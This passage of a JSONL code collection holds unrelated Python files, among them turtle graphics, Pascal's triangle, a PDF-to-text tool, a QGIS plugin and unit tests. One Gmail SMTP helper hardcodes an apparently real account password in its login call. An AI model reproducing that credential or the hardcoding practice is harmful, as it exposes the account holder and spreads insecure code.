encoding=\"utf-8\")\n            self.trazado = []\n            for linea in fichero:\n                if linea != \"\":\n                    punto = linea.split(\",\")\n                    self.add_punto(Punto(punto[0].strip(), punto[1].strip()))\n        except FileNotFoundError:\n            print(\"No existe el fichero.\")\n\n    def dibuja(self):\n        tortuga = self.turtle\n        tortuga.down()\n        for punto in self.trazado:\n            tortuga.setpos(punto.x, punto.y)\n        tortuga.up()\n\n    def toggle_capture(self):\n        \"\"\"Activamos o desactivamos el modo captura, seg\u00fan toque\"\"\"\n        self.capture_mode = not self.capture_mode\n        if not self.capture_mode:\n            self.turtle.reset()\n            self.turtle.up()\n            self.turtle.setpos(self.trazado[0].x, self.trazado[0].y)\n            self.dibuja()\n            fichero = self.screen.textinput(\"Guardar Traza\", \"Dime el nombre del fichero:\")\n            self.dump_traza(fichero + \".txt\")\n            print(self)\n\n    def move_turtle(self, x, y):\n        \"\"\"Si estamos en modo captura, movemos la tortuga y vamos guardando los puntos\"\"\"\n        tortuga = self.turtle\n        if self.capture_mode:\n            tortuga.setheading(tortuga.towards(x, y))\n            tortuga.setpos(x, y)\n            self.add_punto(Punto(x, y))\n\n\ndef test():\n    p = Punto(3, 0)\n    k = Punto(0, 4)\n    tr = Traza(p, k)\n    print(tr)\n    tr.dump_traza(\"traza.txt\")\n    tr.load_traza(\"traza.txt\")\n    print(tr)\n\n    s = turtle.Screen()\n    t = turtle.Turtle()\n    tr.turtle = t\n    tr.screen = s\n    tr.capture_mode = False\n\n    s.onkey(tr.toggle_capture, 'space')\n    s.onclick(tr.move_turtle)\n    s.listen()\n\n    tr.dibuja()\n\n    turtle.done()\n\n    tr.dump_traza(\"traza.txt\")\n\n\ntest()\n"}
{"text": "#----------------------------------------------------------------------------------------------------------------------\n# Introdu\u00e7\u00e3o a Programa\u00e7\u00e3o de Computadores - IPC\n# Universidade do Estado do Amazonas - UEA\n# Prof. Jucimar Jr\n# Alexandre Marques Uch\u00f4a                   1715310028\n# Carlos Eduardo Tapudima de Oliveira\t    1715310030\n# Gabriel de Queiroz Sousa                  1715310044\n# Lucas Gabriel Silveira Duarte             1715310053\n# Nat\u00e1lia Cavalcantre Xavier                1715310021\n#(a) (MAT 83) Imprimir as n primeiras linhas do tri\u00e2ngulo de Pascal (2).\n\n#1\n\n#1    1\n\n#1    2    1\n\n#1    3    3    1\n\n#1    4    6    4    1\n\n#1    5   10   10    5    1\n\n#:\n\n#(b) Imprimir as n primeiras linhas do tri\u00e2ngulo de Pascal usando apenas um vetor.\n\n\nmatriz = []\n\nn = int(input())\n\nfor i in range(n):\n    lista = []\n    for j in range(n):\n        lista.append(0)\n    matriz.append(lista)\nfor i in range(n):\n    for j in range(n):\n        if(i>=j):\n            if(i==0 or i==j):\n                matriz[i][j] = 1\n            else:\n                matriz[i][j] = matriz[i-1][j-1] + matriz[i-1][j]\nfor i in range(n):\n    print(matriz[i])"}
{"text": "# -*- coding: utf-8 -*-\nimport pandas as pd\nimport numpy as np\nimport re\nfrom urlparse import urlparse\n\n\nfx_path_pattern = re.compile('(/firefox/)([0-9a-z\\.]+)/(whatsnew|firstrun|releasenotes)')\nblog_path_pattern = re.compile('(/posts/[0-9]+)(/.*)')\n\n\ndef actual_path(url):\n    #print url\n    path = urlparse(url).path\n    while path.endswith('/'):\n        path = path[:-1]\n    fxPathMatch = fx_path_pattern.search(path)\n    if fxPathMatch:\n        path = fxPathMatch.group(1) + fxPathMatch.group(3)\n    blogPathMatch = blog_path_pattern.search(path)\n    if blogPathMatch:\n        path = blogPathMatch.group(1)\n    print path\n    if path == '':\n        path = '/'\n    return path\n\n\ndef main(argv = []):\n    df = pd.read_hdf('mocotw.h5', 'fx_download')\n    actualPathSeries = df['previousPagePath'].apply(actual_path)\n    print actualPathSeries\n    df['actualPagePath'] = actualPathSeries\n    df.to_hdf('mocotw.h5', 'fx_download')\n\n    df_sum = df[['actualPagePath', 'pageviews']].groupby('actualPagePath').sum().sort('pageviews', ascending=False)\n\n    print df_sum\n\n    df_sum.to_hdf('mocotw.h5', 'fx_download_sum')\n\n    df_stack = df.groupby(['actualPagePath', 'date']).sum()\n    df_stack = df_stack.reset_index()\n    df_stack = df_stack[df_stack.actualPagePath.isin(df_sum[:10].index)]\n    df_stack = df_stack.pivot(index='date', columns='actualPagePath', values='pageviews')\n    df_stack = df_stack.fillna(0)\n    df_stack = df_stack.reset_index()\n\n    print df_stack\n\n    df_stack.to_hdf('mocotw.h5', 'fx_download_stack')\n\n"}
{"text": "# -*- coding: utf-8 -*-\n# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\nimport proto  # type: ignore\n\nfrom google.ads.googleads.v8.enums.types import (\n    placement_type as gage_placement_type,\n)\n\n\n__protobuf__ = proto.module(\n    package=\"google.ads.googleads.v8.resources\",\n    marshal=\"google.ads.googleads.v8\",\n    manifest={\"DetailPlacementView\",},\n)\n\n\nclass DetailPlacementView(proto.Message):\n    r\"\"\"A view with metrics aggregated by ad group and URL or YouTube\n    video.\n\n    Attributes:\n        resource_name (str):\n            Output only. The resource name of the detail placement view.\n            Detail placement view resource names have the form:\n\n            ``customers/{customer_id}/detailPlacementViews/{ad_group_id}~{base64_placement}``\n        placement (str):\n            Output only. The automatic placement string\n            at detail level, e. g. website URL, mobile\n            application ID, or a YouTube video ID.\n        display_name (str):\n            Output only. The display name is URL name for\n            websites, YouTube video name for YouTube videos,\n            and translated mobile app name for mobile apps.\n        group_placement_target_url (str):\n            Output only. URL of the group placement, e.g.\n            domain, link to the mobile application in app\n            store, or a YouTube channel URL.\n        target_url (str):\n            Output only. URL of the placement, e.g.\n            website, link to the mobile application in app\n            store, or a YouTube video URL.\n        placement_type (google.ads.googleads.v8.enums.types.PlacementTypeEnum.PlacementType):\n            Output only. Type of the placement, e.g.\n            Website, YouTube Video, and Mobile Application.\n    \"\"\"\n\n    resource_name = proto.Field(proto.STRING, number=1,)\n    placement = proto.Field(proto.STRING, number=7, optional=True,)\n    display_name = proto.Field(proto.STRING, number=8, optional=True,)\n    group_placement_target_url = proto.Field(\n        proto.STRING, number=9, optional=True,\n    )\n    target_url = proto.Field(proto.STRING, number=10, optional=True,)\n    placement_type = proto.Field(\n        proto.ENUM,\n        number=6,\n        enum=gage_placement_type.PlacementTypeEnum.PlacementType,\n    )\n\n\n__all__ = tuple(sorted(__protobuf__.manifest))\n"}
{"text": "\"\"\"\nAuthor: Omkar Pathak\nCreated At: 25th August 2017\n\"\"\"\nimport inspect\n\ndef longest_increasing_subsequence(_list):\n    \"\"\"\n    The Longest Increasing Subsequence (LIS) problem is to find the length of the longest subsequence of a\n    given sequence such that all elements of the subsequence are sorted in increasing order. For example,\n    the length of LIS for [10, 22, 9, 33, 21, 50, 41, 60, 80] is 6 and LIS is [10, 22, 33, 50, 60, 80].\n\n    :param _list: an array of elements\n    :return: returns a tuple of maximum length of lis and an array of the elements of lis\n    \"\"\"\n    # Initialize list with some value\n    lis = [1] * len(_list)\n    # list for storing the elements in an lis\n    elements = [0] * len(_list)\n\n    # Compute optimized LIS values in bottom up manner\n    for i in range(1, len(_list)):\n        for j in range(0, i):\n            if _list[i] > _list[j] and lis[i] < lis[j] + 1:\n                lis[i] = lis[j]+1\n                elements[i] = j\n\n    # find the maximum of the whole list and get its index in idx\n    maximum = max(lis)\n    idx = lis.index(maximum)\n\n    # for printing the elements later\n    seq = [_list[idx]]\n    while idx != elements[idx]:\n        idx = elements[idx]\n        seq.append(_list[idx])\n\n    return (maximum, seq[::-1])\n\n\ndef get_code():\n    \"\"\"\n    returns the code for the longest_increasing_subsequence function\n    \"\"\"\n    return inspect.getsource(longest_increasing_subsequence)\n"}
{"text": "#!/usr/bin/ python\n# -*- coding: utf-8 -*-\n\nimport sys\nimport smtplib\nfrom email import Encoders\nfrom email.MIMEText import MIMEText\nfrom email.MIMEBase import MIMEBase\nfrom email.MIMEMultipart import MIMEMultipart\nfrom email.Header import Header\nfrom email.Utils import formatdate\n\nclass Gmail(object):\n\tdef create_message(self, from_address, to_address, a_title, file_info, a_body):\n\t\ta_message = MIMEMultipart()\n\t\ta_body = MIMEText(a_body, _charset='iso-2022-jp')\n\t\ta_message['Subject'] = a_title\n\t\ta_message['From'] = from_address\n\t\ta_message['To'] = to_address\n\t\ta_message['Date'] = formatdate()\n\t\ta_message.attach(a_body)\n\n\t\tattachment = MIMEBase(file_info['type'], file_info['subtype'])\n\t\twith open(file_info['path']) as a_file:\n\t\t\tattachment.set_payload(a_file.read())\n\t\tEncoders.encode_base64(attachment)\n\t\ta_message.attach(attachment)\n\t\tattachment.add_header(\"Content-Disposition\", \"attachment\", filename=file_info['name'])\n\t\treturn a_message\n\n\tdef send(self, from_address, to_address, a_message):\n\t\ta_smtp = smtplib.SMTP('smtp.gmail.com', 587)\n\t\ta_smtp.ehlo()\n\t\ta_smtp.starttls()\n\t\ta_smtp.ehlo(0)\n\t\ta_smtp.login(from_address,'4?SiFLV=tY')\n\t\ta_smtp.sendmail(from_address, to_address, a_message.as_string())\n\t\ta_smtp.close()\n"}
{"text": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Business Applications\n#    Copyright (C) 2004-2012 OpenERP S.A. (<http://openerp.com>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom openerp.osv import fields, osv\n\nclass runbot_config_settings(osv.osv_memory):\n    _name = 'runbot.config.settings'\n    _inherit = 'res.config.settings'\n    _columns = {\n    \t'default_workers': fields.integer('Total Number of Workers'),\n        'default_running_max': fields.integer('Maximum Number of Running Builds'),\n        'default_timeout': fields.integer('Default Timeout (in seconds)'),\n        'default_starting_port': fields.integer('Starting Port for Running Builds'),\n        'default_domain': fields.char('Runbot Domain'),\n    }\n\n    def get_default_parameters(self, cr, uid, fields, context=None):\n        icp = self.pool['ir.config_parameter']\n        workers = icp.get_param(cr, uid, 'runbot.workers', default=6)\n        running_max = icp.get_param(cr, uid, 'runbot.running_max', default=75)\n        timeout = icp.get_param(cr, uid, 'runbot.timeout', default=1800)\n        starting_port = icp.get_param(cr, uid, 'runbot.starting_port', default=2000)\n        runbot_domain = icp.get_param(cr, uid, 'runbot.domain', default='runbot.odoo.com')\n        return {\n        \t'default_workers': int(workers),\n        \t'default_running_max': int(running_max),\n            'default_timeout': int(timeout),\n            'default_starting_port': int(starting_port),\n            'default_domain': runbot_domain,\n        }\n\n    def set_default_parameters(self, cr, uid, ids, context=None):\n        config = self.browse(cr, uid, ids[0], context)\n        icp = self.pool['ir.config_parameter']\n        icp.set_param(cr, uid, 'runbot.workers', config.default_workers)\n        icp.set_param(cr, uid, 'runbot.running_max', config.default_running_max)\n        icp.set_param(cr, uid, 'runbot.timeout', config.default_timeout)\n        icp.set_param(cr, uid, 'runbot.starting_port', config.default_starting_port)\n        icp.set_param(cr, uid, 'runbot.domain', config.default_domain)\n\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n"}
{"text": "#\n# pdf2txt.py from the FOSS python PDFMiner package\n# http://euske.github.io/pdfminer/index.html#pdf2txt\n# Extract text from PDF to text files\n#\n# Has to be run separately with python2.X (not compatible with python3.X)\n#\n\nimport sys\nfrom pdfminer.pdfdocument import PDFDocument\nfrom pdfminer.pdfparser import PDFParser\nfrom pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter\nfrom pdfminer.pdfdevice import PDFDevice, TagExtractor\nfrom pdfminer.pdfpage import PDFPage\nfrom pdfminer.converter import XMLConverter, HTMLConverter, TextConverter\nfrom pdfminer.cmapdb import CMapDB\nfrom pdfminer.layout import LAParams\nfrom pdfminer.image import ImageWriter\n\n\ndef main(argv):\n    import getopt\n\n    def usage():\n        print('usage: %s [-d] [-p pagenos] [-m maxpages] [-P password] [-o output]'\n              ' [-C] [-n] [-A] [-V] [-M char_margin] [-L line_margin] [-W word_margin]'\n              ' [-F boxes_flow] [-Y layout_mode] [-O output_dir] [-R rotation]'\n              ' [-t text|html|xml|tag] [-c codec] [-s scale]'\n              ' file ...' % argv[0])\n        return 100\n\n    try:\n        (opts, args) = getopt.getopt(argv[1:], 'dp:m:P:o:CnAVM:L:W:F:Y:O:R:t:c:s:')\n    except getopt.GetoptError:\n        return usage()\n    if not args:\n        return usage()\n    # debug option\n    debug = 0\n    # input option\n    password = ''\n    pagenos = set()\n    maxpages = 0\n    # output option\n    outfile = None\n    outtype = None\n    imagewriter = None\n    rotation = 0\n    layoutmode = 'normal'\n    codec = 'utf-8'\n    pageno = 1\n    scale = 1\n    caching = True\n    showpageno = True\n    laparams = LAParams()\n    for (k, v) in opts:\n        if k == '-d':\n            debug += 1\n        elif k == '-p':\n            pagenos.update(int(x) - 1 for x in v.split(','))\n        elif k == '-m':\n            maxpages = int(v)\n        elif k == '-P':\n            password = v\n        elif k == '-o':\n            outfile = v\n        elif k == '-C':\n            caching = False\n        elif k == '-n':\n            laparams = None\n        elif k == '-A':\n            laparams.all_texts = True\n        elif k == '-V':\n            laparams.detect_vertical = True\n        elif k == '-M':\n            laparams.char_margin = float(v)\n        elif k == '-L':\n            laparams.line_margin = float(v)\n        elif k == '-W':\n            laparams.word_margin = float(v)\n        elif k == '-F':\n            laparams.boxes_flow = float(v)\n        elif k == '-Y':\n            layoutmode = v\n        elif k == '-O':\n            imagewriter = ImageWriter(v)\n        elif k == '-R':\n            rotation = int(v)\n        elif k == '-t':\n            outtype = v\n        elif k == '-c':\n            codec = v\n        elif k == '-s':\n            scale = float(v)\n    #\n    PDFDocument.debug = debug\n    PDFParser.debug = debug\n    CMapDB.debug = debug\n    PDFResourceManager.debug = debug\n    PDFPageInterpreter.debug = debug\n    PDFDevice.debug = debug\n    #\n    rsrcmgr = PDFResourceManager(caching=caching)\n    if not outtype:\n        outtype = 'text'\n        if outfile:\n            if outfile.endswith('.htm') or outfile.endswith('.html'):\n                outtype = 'html'\n            elif outfile.endswith('.xml'):\n                outtype = 'xml'\n            elif outfile.endswith('.tag'):\n                outtype = 'tag'\n    if outfile:\n        outfp = file(outfile, 'w')\n    else:\n        outfp = sys.stdout\n    if outtype == 'text':\n        device = TextConverter(rsrcmgr, outfp, codec=codec, laparams=laparams,\n                               imagewriter=imagewriter)\n    elif outtype == 'xml':\n        device = XMLConverter(rsrcmgr, outfp, codec=codec, laparams=laparams,\n                              imagewriter=imagewriter)\n    elif outtype == 'html':\n        device = HTMLConverter(rsrcmgr, outfp, codec=codec, scale=scale,\n                               layoutmode=layoutmode, laparams=laparams,\n                               imagewriter=imagewriter)\n    elif outtype == 'tag':\n        device = TagExtractor(rsrcmgr, outfp, codec=codec)\n    else:\n        return usage()\n    for fname in args:\n        fp = file(fname, 'rb')\n        interpreter = PDFPageInterpreter(rsrcmgr, device)\n        for page in PDFPage.get_pages(fp, pagenos,\n                                      maxpages=maxpages, password=password,\n                                      caching=caching, check_extractable=True):\n            page.rotate = (page.rotate + rotation) % 360\n            interpreter.process_page(page)\n        fp.close()\n    device.close()\n    outfp.close()\n    return\n\n\nif __name__ == '__main__':\n    sys.exit(main(sys.argv))\n"}
{"text": "# -*- coding:utf-8 -*-\n\"\"\"\n/***************************************************************************\n CopyLayersAndGroupsToClipboard\n                                 A QGIS plugin\n Copy selected layers and groups from Layers Panel to clipboard, so that they can be pasted in other QGIS instances.\n                             -------------------\n        begin                : 2017-02-05\n        copyright            : (C) 2017 by German Carrillo, GeoTux\n        email                : gcarrillo@linuxmail.org\n***************************************************************************/\n\n/***************************************************************************\n *                                                                         *\n *   This program is free software; you can redistribute it and/or modify  *\n *   it under the terms of the GNU General Public License as published by  *\n *   the Free Software Foundation; either version 2 of the License, or     *\n *   (at your option) any later version.                                   *\n *                                                                         *\n ***************************************************************************/\n\"\"\"\nimport os\nimport time\nimport tempfile\nimport codecs\n\nfrom qgis.core import ( QgsLayerDefinition, QgsProject )\nfrom PyQt4.QtGui import QApplication, QIcon, QAction\nfrom PyQt4.QtXml import QDomDocument\n\nimport resources_rc\n\nclass CopyLayersAndGroupsToClipboard:\n\n    def __init__( self, iface ):\n        self.iface = iface\n        self.doc = None\n        self.layersElement = None\n        self.clipboard = QApplication.clipboard()\n\n    def initGui( self ):\n        icon = QIcon()\n        icon.addFile( \":/plugins/CopyLayersAndGroupsToClipboard/copy.png\" )\n        self.actionCopy = QAction( icon, u\"Copy selected layers and groups to clipboard (Ctrl+Ins)\", self.iface.mainWindow() )\n        self.actionCopy.triggered.connect( self.copy )\n        self.iface.registerMainWindowAction( self.actionCopy, \"Ctrl+Ins\" )\n\n        icon = QIcon()\n        icon.addFile( \":/plugins/CopyLayersAndGroupsToClipboard/paste.png\" )\n        self.actionPaste = QAction( icon, u\"Paste layers and groups from clipboard (Shift+Ins)\", self.iface.mainWindow() )\n        self.actionPaste.triggered.connect( self.paste )\n        self.iface.registerMainWindowAction( self.actionPaste, \"Shift+Ins\" )\n\n        self.iface.addPluginToMenu( u\"Copy selected layers and groups to clipboard\", self.actionCopy )\n        self.iface.addPluginToMenu( u\"Copy selected layers and groups to clipboard\", self.actionPaste )\n\n        self.toolbar = self.iface.addToolBar( \"Copy layers and groups to clipboard\" )\n        self.toolbar.setObjectName(\"CopyLayersAndGroupsToClipboard\")\n        self.toolbar.addAction( self.actionCopy )\n        self.toolbar.addAction( self.actionPaste )\n\n    def unload( self ):\n        self.iface.removePluginMenu( u\"Copy selected layers and groups to clipboard\", self.actionCopy )\n        self.iface.removePluginMenu( u\"Paste layers and groups from clipboard\", self.actionPaste )\n        self.iface.mainWindow().removeToolBar( self.toolbar )\n\n    def copy( self ):\n        # Iterate\n        selectedNodes = self.iface.layerTreeView().selectedNodes( True )\n        if len( selectedNodes) == 0:\n            self.iface.messageBar().pushMessage( \"Copy layers and groups\", \"First select at least 1 layer or group in the Layers Panel.\", 0, 7 )\n            return\n\n        doc = QDomDocument( \"QGIS-layers-and-groups\" )\n        QgsLayerDefinition.exportLayerDefinition( doc, selectedNodes, \"\", \"\" )\n\n        tempDir = tempfile.gettempdir()\n        xmlFilePath = os.path.join( tempDir, str(time.time()).replace(\".\",\"\")+\".qlr\" )\n        f = codecs.open( xmlFilePath, 'w', encoding='utf-8' )\n        f.write( doc.toString() )\n        f.close()\n\n        self.clipboard.setText( \"@QGIS-layers-and-groups@{}\".format( xmlFilePath ) )\n        self.iface.messageBar().pushMessage( \"Copy layers and groups\", \"Selected layers and/or groups were copied to clipboard.\", 0, 5 )\n\n    def paste( self ):\n        bNoClipboardData = False\n        clipboardText = self.clipboard.text()\n\n        if not ( isinstance( clipboardText, str ) or isinstance( clipboardText, unicode ) ):\n            self.showNoDataMessage()\n            return\n\n        xmlFilePath = clipboardText.split( \"@QGIS-layers-and-groups@\" )\n        if len( xmlFilePath ) != 2:\n            self.showNoDataMessage()\n            return\n\n        xmlFilePath = xmlFilePath[1] # Get payload\n\n        if not ( os.path.isfile( xmlFilePath ) and os.path.splitext( xmlFilePath )[1] == '.qlr' ):\n            self.showNoDataMessage()\n            return\n\n        QgsLayerDefinition.loadLayerDefinition( xmlFilePath, QgsProject.instance().layerTreeRoot() )\n\n\n    def showNoDataMessage( self ):\n        self.iface.messageBar().pushMessage( \"Copy layers and groups\", \"The clipboard doesn't contain valid QGIS layers and/or groups to paste.\", 1, 7 )\n"}
{"text": "##\n# Copyright (c) 2005-2015 Apple Inc. All rights reserved.\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n#\n# DRI: Wilfredo Sanchez, wsanchez@apple.com\n##\n\nfrom txweb2.iweb import IResponse\n\nimport txweb2.dav.test.util\nfrom txweb2.test.test_server import SimpleRequest\n\nclass OPTIONS(txweb2.dav.test.util.TestCase):\n    \"\"\"\n    OPTIONS request\n    \"\"\"\n    def test_DAV1(self):\n        \"\"\"\n        DAV level 1\n        \"\"\"\n        return self._test_level(\"1\")\n\n\n    def test_DAV2(self):\n        \"\"\"\n        DAV level 2\n        \"\"\"\n        return self._test_level(\"2\")\n\n    test_DAV2.todo = \"DAV level 2 unimplemented\"\n\n    def test_ACL(self):\n        \"\"\"\n        DAV ACL\n        \"\"\"\n        return self._test_level(\"access-control\")\n\n\n    def _test_level(self, level):\n        def doTest(response):\n            response = IResponse(response)\n\n            dav = response.headers.getHeader(\"dav\")\n            if not dav:\n                self.fail(\"no DAV header: %s\" % (response.headers,))\n            self.assertIn(level, dav, \"no DAV level %s header\" % (level,))\n\n            return response\n\n        return self.send(SimpleRequest(self.site, \"OPTIONS\", \"/\"), doTest)\n"}
{"text": "# Copyright (c) Pedro Matiello <pmatiello@gmail.com>\n#\n# Permission is hereby granted, free of charge, to any person\n# obtaining a copy of this software and associated documentation\n# files (the \"Software\"), to deal in the Software without\n# restriction, including without limitation the rights to use,\n# copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the\n# Software is furnished to do so, subject to the following\n# conditions:\n\n# The above copyright notice and this permission notice shall be\n# included in all copies or substantial portions of the Software.\n\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n# OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n# HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n# OTHER DEALINGS IN THE SOFTWARE.\n\n\n\"\"\"\nUnittests for graph.algorithms.sorting\n\"\"\"\n\n\nimport unittest\nimport pygraph.classes\nfrom pygraph.algorithms.sorting import topological_sorting\nfrom pygraph.algorithms.searching import depth_first_search\nfrom sys import getrecursionlimit\nimport testlib\n\n\nclass test_topological_sorting(unittest.TestCase):\n\n    def test_topological_sorting_on_tree(self):\n        gr = testlib.new_graph()\n        st, pre, post = depth_first_search(gr)\n        tree = pygraph.classes.digraph.digraph()\n\n        \n        for each in st:\n            if st[each]:\n                if (each not in tree.nodes()):\n                    tree.add_node(each)\n                if (st[each] not in tree.nodes()):\n                    tree.add_node(st[each])\n                tree.add_edge((st[each], each))\n        \n        ts = topological_sorting(tree)\n        for each in ts:\n            if (st[each]):\n                assert ts.index(each) > ts.index(st[each])\n    \n    def test_topological_sorting_on_digraph(self):\n        \n        def is_ordered(node, list):\n            # Has parent on list\n            for each in list:\n                if gr.has_edge((each, node)):\n                    return True\n            # Has no possible ancestors on list\n            st, pre, post = depth_first_search(gr, node)\n            for each in list:\n                if (each in st):\n                    return False\n            return True\n            \n        gr = testlib.new_digraph()\n        ts = topological_sorting(gr)\n        \n        while (ts):\n            x = ts.pop()\n            assert is_ordered(x, ts)\n\n    def test_topological_sort_on_very_deep_graph(self):\n        gr = pygraph.classes.graph.graph()\n        gr.add_nodes(range(0,20001))\n        for i in range(0,20000):\n            gr.add_edge((i,i+1))\n        recursionlimit = getrecursionlimit()\n        topological_sorting(gr)\n        assert getrecursionlimit() == recursionlimit\n            \nif __name__ == \"__main__\":\n    unittest.main()"}
{"text": "# -*- coding: utf-8 -*-\nfrom __future__ import division\nimport numpy as np\nfrom batemaneq import (\n    bateman_full, bateman_full_arr, bateman_parent, bateman_parent_arr\n)\nimport pytest\n\ndecay_analytic = {\n    0: lambda y0, k, t: (\n        y0[0] * np.exp(-k[0]*t)),\n    1: lambda y0, k, t: (\n        y0[1] * np.exp(-k[1] * t) + y0[0] * k[0] / (k[1] - k[0]) *\n        (np.exp(-k[0]*t) - np.exp(-k[1]*t))),\n    2: lambda y0, k, t: (\n        y0[2] * np.exp(-k[2] * t) + y0[1] * k[1] / (k[2] - k[1]) *\n        (np.exp(-k[1]*t) - np.exp(-k[2]*t)) +\n        k[1] * k[0] * y0[0] / (k[1] - k[0]) *\n        (1 / (k[2] - k[0]) * (np.exp(-k[0]*t) - np.exp(-k[2]*t)) -\n         1 / (k[2] - k[1]) * (np.exp(-k[1]*t) - np.exp(-k[2]*t))))\n}\n\n\ndef decay_get_Cref(k, y0, tout):\n    coeffs = k + [0]*(3-len(k))\n    return np.column_stack([\n        decay_analytic[i](y0, coeffs, tout) for i in range(\n            min(3, len(k)+1))])\n\n\ndef test_bateman_full():\n    k0, k1, k2 = 2.0, 3.0, 4.0\n    k = [k0, k1, k2]\n    y0 = [0.7, 0.3, 0.5]\n    t = np.linspace(0, 10, 17)\n    yout = bateman_full(y0, k, t, exp=np.exp)\n    yref = decay_get_Cref(k, y0, t)\n    assert np.allclose(np.asarray(yout).T, yref)\n\n\ndef test_bateman_parent_arr():\n    k = k0, k1, k2 = 2.0, 3.0, 4.0\n    t = np.linspace(0, 10, 16).reshape((2, 2, 2, 2))\n    yout = bateman_parent_arr(np.asarray(k), t)\n    assert yout.shape == (2, 2, 2, 2, 3)\n    yref = decay_get_Cref(list(k), np.array([1., 0, 0]), np.array(t.flat))\n    assert np.allclose(yout, yref.reshape(yout.shape))\n\n\ndef test_bateman_full_arr():\n    k0, k1, k2 = 2.0, 3.0, 4.0\n    k = [k0, k1, k2]\n    y0 = [0.7, 0.3, 0.5]\n    t = np.linspace(0, 10, 10)\n    yout = bateman_full_arr(np.asarray(y0), np.asarray(k), t.reshape((2, 5)))\n    yref = decay_get_Cref(k, y0, t)\n    assert np.allclose(yout, yref.reshape((2, 5, 3)))\n\n\ndef _yi1(i, p, a, binom):\n    return binom(p+i-1, p) * a**(-1-p) * ((a-1)/a)**(i-1)\n\n\n@pytest.mark.parametrize('p', (0, 1, 2, 3, 4, 5))\ndef test_bateman_parent(p):\n    from scipy.special import binom\n    from math import log\n    N = 32\n    a = 27\n    lmbd = [(i+p+1)*log(a) for i in range(N)]\n    bp = bateman_parent(lmbd, 1)\n    for i, v in enumerate(bp, 1):\n        assert abs(v - _yi1(i, p, a, binom)) < 1e-14\n"}
{"text": "#!/usr/bin/env python\n\nimport time\nfrom sys import exit\n\ntry:\n    from PIL import Image\nexcept ImportError:\n    exit('This script requires the pillow module\\nInstall with: sudo pip install pillow')\n\nimport unicornhathd\n\n\nprint(\"\"\"Unicorn HAT HD: Show a PNG image!\n\nThis basic example shows use of the Python Pillow library.\n\nThe tiny 16x16 bosses in lofi.png are from Oddball:\nhttp://forums.tigsource.com/index.php?topic=8834.0\n\nLicensed under Creative Commons Attribution-Noncommercial-Share Alike 3.0\nUnported License.\n\nPress Ctrl+C to exit!\n\n\"\"\")\n\nunicornhathd.rotation(0)\nunicornhathd.brightness(0.6)\n\nwidth, height = unicornhathd.get_shape()\n\nimg = Image.open('lofi.png')\n\ntry:\n    while True:\n        for o_x in range(int(img.size[0] / width)):\n            for o_y in range(int(img.size[1] / height)):\n\n                valid = False\n                for x in range(width):\n                    for y in range(height):\n                        pixel = img.getpixel(((o_x * width) + y, (o_y * height) + x))\n                        r, g, b = int(pixel[0]), int(pixel[1]), int(pixel[2])\n                        if r or g or b:\n                            valid = True\n                        unicornhathd.set_pixel(x, y, r, g, b)\n\n                if valid:\n                    unicornhathd.show()\n                    time.sleep(0.5)\n\nexcept KeyboardInterrupt:\n    unicornhathd.off()\n"}
